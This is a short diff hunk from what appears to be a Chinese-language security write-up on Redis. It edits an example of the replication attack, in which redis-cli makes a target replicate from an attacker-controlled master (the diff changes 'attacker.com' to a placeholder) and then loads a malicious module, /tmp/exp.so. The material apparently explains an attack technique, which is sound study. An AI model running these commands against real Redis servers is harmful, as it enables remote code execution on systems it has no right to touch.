@@ -109,7 +109,7 @@ BGSAVE
 
 ```bash
 # 攻击者搭建恶意 Redis Master
-redis-cli -h target SLAVEOF attacker.com 6379
+redis-cli -h target SLAVEOF <attacker-domain> 6379
 # 加载恶意模块
 redis-cli -h target MODULE LOAD /tmp/exp.so
 ```
